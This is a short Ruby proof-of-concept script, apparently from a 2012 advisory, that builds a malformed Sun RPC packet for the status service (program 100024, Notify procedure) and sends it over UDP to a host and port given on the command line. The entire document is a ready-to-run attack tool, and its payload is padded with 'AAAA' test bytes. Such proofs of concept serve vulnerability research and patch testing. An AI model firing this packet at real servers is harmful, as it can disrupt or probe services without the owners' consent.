#!/usr/bin/ruby
 
require 'socket'
 
rpc_server = (ARGV[0])
target_port = (ARGV[1] || 32778)
 
#RPC/Portmap packet
beepbeep=
"\x1c\xd1\xef\xab"  + # XID
"\x00\x00\x00\x00" + # Message Type: Call (0)
"\x00\x00\x00\x02" + # RPC Version: 2
"\x00\x01\x86\xb8" + # Program: 100024
"\x00\x00\x00\x01" + # Program Version: 1
"\x00\x00\x00\x06" + # Procedure: Notify
 
"\x00\x00\x00\x01\x00\x00\x00\x18\x09\x27\x4a\x76\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00" +
 
"\x00\x00\x00\x00\x00\x00\x00\x00" + # Verifier NULL
 
 
 
"\x41\x41\x41\x41"
 
 
 
puts "[+]Sending UDP Packet...\n"
puts "[+] beep beep\n"
puts "[+]No, it's not the road runner\n"
 
 
if (!(rpc_server && target_port))
    puts "Usage: PRL-2012-01.rb host port (default port: 32778)\n"
    exit
else
     
    sock = UDPSocket.open
    sock.connect(rpc_server, target_port.to_i)
    sock.send(beepbeep, 0)
end